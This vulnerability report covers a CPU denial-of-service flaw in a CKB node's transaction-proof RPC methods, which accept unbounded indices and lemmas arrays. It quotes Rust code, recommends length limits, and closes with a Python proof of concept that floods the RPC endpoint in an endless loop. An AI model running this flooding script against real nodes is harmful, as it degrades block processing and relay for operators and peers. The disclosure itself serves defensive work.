### Title
Unbounded `indices` and `lemmas` Arrays in `verify_transaction_proof` / `verify_transaction_and_witness_proof` RPC Enable CPU DoS — (File: `rpc/src/module/chain.rs`)

### Summary

The `verify_transaction_proof` and `verify_transaction_and_witness_proof` RPC methods accept caller-supplied `indices` and `lemmas` arrays inside the proof struct with no size limit. An RPC caller can supply arrays containing hundreds of thousands of entries (bounded only by the 10 MiB HTTP body limit), forcing the node to perform proportional Merkle hashing work per request at zero cost to the caller. This is a direct analog to the `in3_sign` DoS: an array input causes unbounded server-side computation.

### Finding Description

**Root cause — no size check before Merkle computation:**

`verify_transaction_proof` constructs a `MerkleProof` directly from the caller-supplied `proof.indices` and `proof.lemmas` without any length validation:

```rust
// rpc/src/module/chain.rs  lines 1948–1961
let merkle_proof = MerkleProof::new(
    tx_proof.proof.indices.into_iter()
        .map(|index| index.value()).collect(),   // attacker-controlled, unbounded
    tx_proof.proof.lemmas.into_iter()
        .map(|lemma| lemma.into()).collect(),    // attacker-controlled, unbounded
);
CBMT::retrieve_leaves(block.tx_hashes(), &merkle_proof)  // iterates all indices
    .and_then(|tx_hashes| merkle_proof.root(&tx_hashes)  // hashes all lemmas
    ...
```

`verify_transaction_and_witness_proof` does this **twice** — once for `transactions_proof` and once for `witnesses_proof` — doubling the work:

```rust
// rpc/src/module/chain.rs  lines 2016–2043
let transactions_merkle_proof = MerkleProof::new(
    tx_proof.transactions_proof.indices ...  // unbounded
    tx_proof.transactions_proof.lemmas  ...  // unbounded
);
let witnesses_merkle_proof = MerkleProof::new(
    tx_proof.witnesses_proof.indices    ...  // unbounded
    tx_proof.witnesses_proof.lemmas     ...  // unbounded
);
CBMT::retrieve_leaves(..., &witnesses_merkle_proof)  // iterates all
CBMT::retrieve_leaves(..., &transactions_merkle_proof) // iterates all
```

The only pre-computation check is that the referenced `block_hash` exists in the chain — a trivially satisfiable condition using any known block hash. No check on `indices.len()` or `lemmas.len()` exists anywhere in the call path.

**Contrast with the light-client P2P handler**, which correctly enforces a limit before doing any work:

```rust
// util/light-client-protocol-server/src/components/get_transactions_proof.rs  lines 37–39
if self.message.tx_hashes().len() > constant::GET_TRANSACTIONS_PROOF_LIMIT {
    return StatusCode::MalformedProtocolMessage.with_context("too many transactions");
}
```

The RPC handlers have no equivalent guard.

**Body-size bound and amplification:**

The default `max_request_body_size` is 10 MiB. Each `H256` lemma is 32 bytes (JSON hex ~66 bytes). A single request can carry ~150,000 lemmas. Each lemma requires a blake2b hash call during `merkle_proof.root()`. For `verify_transaction_and_witness_proof`, the attacker gets two full proof structs in one request, doubling the hash count. Requests can be pipelined continuously with no authentication or rate limit on the Chain RPC module.

**The `rpc_batch_limit` does not help here** — it limits the number of JSON-RPC calls in a batch array, not the size of arrays within a single call's parameters. It is also opt-in and disabled by default.

### Impact Explanation

A single RPC caller (local or remote if the operator has exposed the RPC port) can sustain high CPU load on the CKB node by continuously sending `verify_transaction_and_witness_proof` requests with maximally-sized `indices`/`lemmas` arrays. This degrades or halts block processing, P2P message handling, and transaction relay, since the RPC server shares the node process. The node may become unresponsive to legitimate peers and miners.

### Likelihood Explanation

The Chain RPC module is enabled by default and the `verify_transaction_proof` method requires only a valid block hash — any block hash from the public chain suffices. No tokens, keys, or special privileges are needed. The attack is trivially scriptable and repeatable.

### Recommendation

Add an explicit upper-bound check on `indices.len()` and `lemmas.len()` at the start of both `verify_transaction_proof` and `verify_transaction_and_witness_proof`, before any Merkle computation is performed. A reasonable limit is the maximum number of transactions per block (derivable from `max_block_bytes / min_tx_size`). Similarly, add an upper-bound check on `tx_hashes.len()` in `get_tx_indices` (currently only checks `is_empty()`).

### Proof of Concept

```python
import requests, json

# Any valid block hash from the chain
block_hash = "0x7978ec7ce5b507cfb52e149e36b1a23f6062ed150503c85bbf825da3599095ed"

# Craft a proof with 100,000 lemmas — all zeros, will fail verification
# but the node performs all hashing before returning the error
large_lemmas = ["0x" + "00" * 32] * 100_000
large_indices = ["0x0"] * 100_000

payload = {
    "jsonrpc": "2.0", "id": 1,
    "method": "verify_transaction_and_witness_proof",
    "params": [{
        "block_hash": block_hash,
        "transactions_proof": {"indices": large_indices, "lemmas": large_lemmas},
        "witnesses_proof":    {"indices": large_indices, "lemmas": large_lemmas}
    }]
}

# Send in a tight loop to sustain CPU pressure
while True:
    requests.post("http://127.0.0.1:8114", json=payload)
```

Each iteration forces the node to perform ~400,000 blake2b hash operations before returning `"Invalid transaction_and_witness proof"`.
